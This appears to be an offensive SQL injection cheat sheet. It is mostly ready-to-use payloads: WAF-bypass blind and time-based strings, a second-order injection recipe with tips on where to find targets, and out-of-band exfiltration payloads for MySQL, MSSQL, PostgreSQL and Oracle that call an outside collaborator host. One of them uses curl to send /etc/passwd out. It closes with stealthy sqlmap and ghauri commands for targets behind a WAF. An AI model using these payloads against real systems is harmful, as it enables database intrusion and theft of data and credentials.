# SQL Injection: Advanced Exploitation

## Blind SQLi With WAF Bypass

### Time-Based Detection Through WAFs
```sql
-- Bypass SLEEP keyword filter
AND (SELECT * FROM (SELECT(SLEEP(5)))a)
AND BENCHMARK(5000000, MD5('test'))
AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B) -- Heavy query
```

### Comment & Whitespace Bypasses
```sql
'/**/OR/**/1=1-- -
'%0AOR%0A1=1-- -
'/*!50000OR*/1=1-- -
'||'1'='1          -- PostgreSQL/Oracle OR bypass
```

## Second-Order SQL Injection

Insert payload into one feature, trigger in another:
1. Register username: `' OR '1'='1' -- -`
2. The username is stored safely (parameterized in insert)
3. Admin tool retrieves username via `SELECT * FROM users WHERE username='$username'` — injection fires

**Where to look:** Newsletter signups, profile names that appear in admin panels, referral codes displayed on dashboards.

## OOB SQLi Exfiltration

When data cannot be retrieved in-band or through errors:

### MySQL OOB (LOAD_FILE + UNC)
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.collaborator.oastify.com\\test'))-- -
```

### MSSQL OOB (xp_dirtree)
```sql
'; EXEC master..xp_dirtree '\\collaborator.oastify.com\share'-- -
-- No privileges required for DNS callback
'; DECLARE @v VARCHAR(8000); SELECT @v=@@version; EXEC('master..xp_dirtree ''\\'+@v+'.collaborator.oastify.com\test'';')-- -
```

### PostgreSQL OOB (COPY TO PROGRAM)
```sql
'; COPY (SELECT version()) TO PROGRAM 'curl http://collaborator.oastify.com/?v=$(cat /etc/passwd|base64)'-- -
```

### Oracle OOB (UTL_HTTP)
```sql
'||(SELECT UTL_HTTP.REQUEST('http://collaborator.oastify.com/?v='||(SELECT user FROM dual)) FROM dual)||'
```

## Automation Strategy

```bash
# SQLMap with stealth
sqlmap -r request.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3
# Ghauri for WAF-heavy targets (cloudflare, akamai)
ghauri -r request.txt --confirm --delay=2 --random-agent
```

### ORM Injection Detection
```bash
# Hibernate/Sequelize/JPA often accept raw query params
# Test non-standard syntax that ORMs pass through
'}; SELECT * FROM users;--
'-- -
' AND 1=CAST((SELECT 1) AS INT)--
```
